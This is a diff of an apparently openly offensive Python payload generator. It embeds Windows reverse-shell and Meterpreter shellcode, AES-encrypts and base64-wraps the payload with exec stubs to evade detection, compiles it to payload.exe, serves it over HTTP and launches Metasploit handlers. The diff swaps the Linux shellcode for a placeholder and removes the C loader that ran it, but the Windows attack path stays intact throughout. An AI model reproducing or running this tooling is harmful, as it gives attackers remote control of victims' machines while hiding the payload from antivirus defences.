@@ -28,7 +28,7 @@ def ServePayload():
     httpd.serve_forever()
 
 
-def PyCipher(filecontents): # Adaptation of PyHerion 1.0 By: @harmj0y
+def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
     BLOCK_SIZE = 32
     PADDING = '{'
     imports = list()
@@ -36,16 +36,20 @@ def PyCipher(filecontents): # Adaptation of PyHerion 1.0 By: @harmj0y
 
     def randKey(bytes):
         return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))
+
     def randVar():
         return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))
+
     def pad(s):
         return str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
-    def EncodeAES(c,s):
+
+    def EncodeAES(c, s):
         return base64.b64encode(c.encrypt(pad(s)))
-    def DecodeAES(c,e):
+
+    def DecodeAES(c, e):
         return c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 
-    key,iv = randKey(32),randKey(16)
+    key, iv = randKey(32), randKey(16)
 
     input = filecontents.split('\n')
     pieces = filecontents.split(".")
@@ -63,7 +67,7 @@ def PyCipher(filecontents): # Adaptation of PyHerion 1.0 By: @harmj0y
 
     encrypted = EncodeAES(cipherEnc, "".join(output))
 
-    b64var,aesvar = randVar(),randVar()
+    b64var, aesvar = randVar(), randVar()
 
     imports.append("from base64 import b64decode as %s" % (b64var))
     imports.append("from Crypto.Cipher import AES as %s" % (aesvar))
@@ -72,7 +76,8 @@ def PyCipher(filecontents): # Adaptation of PyHerion 1.0 By: @harmj0y
 
     newoutput = ";".join(imports) + "\n"
 
-    newoutput += "exec(%s(\"%s\"))" %(b64var, base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar, key, b64var, encrypted)))
+    newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode(
+        "exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
     return newoutput
 
 windows_rev_shell = (
@@ -152,12 +157,7 @@ windows_met_bind_shell = (
     "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
     "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")
 
-linux_x86_met_rev_shell = (
-    "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
-    "\x97\x5b\x68%s\x68\x02\x00%s\x89\xe1\x6a"
-    "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
-    "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
-    "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")
+linux_x86_met_rev_shell = ('placeholder%s%s')
 
 payload, payloadchoice, payloaddir, ez2read_shellcode = '', '', '/etc/winpayloads', ''
 
@@ -177,7 +177,7 @@ print "   /____/".center(t.width)
 print t.normal + '=' * t.width
 
 try:
-    print '[1] Windows Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Linux x86 Meterpreter Reverse Shell(staged)'.center(t.width)
+    print '[1] Windows Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Placeholder'.center(t.width)
     print '=' * t.width
     menuchoice = raw_input('> ')
     if menuchoice == '1':
@@ -191,7 +191,7 @@ try:
         payload = 'Windows Meterpreter Bind Shell'
     elif menuchoice == '4':
         payloadchoice = linux_x86_met_rev_shell
-        payload = 'Linux x86 Meterpreter Reverse Shell '
+        payload = 'Placeholder '
     else:
         print t.bold_red + '[*] Wrong Selection' + t.normal
         sys.exit(1)
@@ -251,59 +251,29 @@ ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 """ % shellcode
 
-    injectlinux = """
-#include <stdio.h>
+    with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
+        Filesave.write(PyCipher(injectwindows))
+        Filesave.close()
 
-char shellcode[] = "%s";
+    print '[*] Creating Payload.exe From Payload.py...'
 
-int main(int argc, char **argv) {
-    (*(void(*)())shellcode)();
-    return 0;
-}
-""" % shellcode
-    if menuchoice == '4':
-        with open('%s/payload.c' % payloaddir, 'w+') as Filesave:
-            Filesave.write(injectlinux)
-            Filesave.close()
-    else:
-        with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(PyCipher(injectwindows))
-            Filesave.close()
+    subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
+                     '%s/payload.py' % payloaddir, '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    print '[*] Cleaning Up...'
+    os.system('mv %s/dist/payload.exe %s/payload.exe' %
+              (payloaddir, payloaddir))
+    os.system('rm %s/logdict*' % os.getcwd())
+    os.system('rm %s/dist -r' % payloaddir)
+    os.system('rm %s/build -r' % payloaddir)
+    os.system('rm %s/*.spec' % payloaddir)
+    #os.system('rm %s/payload.py' % payloaddir)
 
-    if menuchoice == '4':
-        print '[*] Creating Payload From Payload.py...'
-    else:
-        print '[*] Creating Payload.exe From Payload.py...'
-    if menuchoice == '4':
-        arch32or64 = raw_input('\n[*] Compile For [32]/64?\n[*] Arch> ')
-        if arch32or64 == '32' or arch32or64 == '':
-            subprocess.call(['gcc','-m32','%s/payload.c' % payloaddir, '-o','%s/payload' % payloaddir])#, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        else:
-            subprocess.call(['gcc','-m64','%s/payload.c' % payloaddir, '-o','%s/payload' % payloaddir])#, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        #os.system('rm %s/payload.c' % payloaddir)
-    else:
-        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
-                         '%s/payload.py' % payloaddir, '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        print '[*] Cleaning Up...'
-        os.system('mv %s/dist/payload.exe %s/payload.exe' %(payloaddir, payloaddir))
-        os.system('rm %s/logdict*' % os.getcwd())
-        os.system('rm %s/dist -r' % payloaddir)
-        os.system('rm %s/build -r' % payloaddir)
-        os.system('rm %s/*.spec' % payloaddir)
-        #os.system('rm %s/payload.py' % payloaddir)
-
-    if menuchoice == '4':
-        print '\n[*] Payload Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload' % payloaddir + t.normal
-    else:
-        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal
+    print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal
 
     want_to_upload = raw_input(
         '[*] Upload To Local Websever? [y]/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
-        if menuchoice == '4':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload" % (IP) + t.normal
-        else:
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
+        print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
         t = multiprocessing.Process(target=ServePayload)
         t.start()
 
@@ -313,7 +283,7 @@ int main(int argc, char **argv) {
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;exploit\'' % portnum)
     elif menuchoice == '3':
         bindip = raw_input(
-            '\n[*] Enter Target Ip Address To Connect To Bind Shell\n[*] IP> ')
+            '\n[*] Enter Target Ip Address For Metasploit To Connect To The Bind Shell\n[*] IP> ')
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;exploit \'' % (bindport, bindip))
     elif menuchoice == '4':
         os.system('msfconsole -x \'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;exploit\'' % portnum)
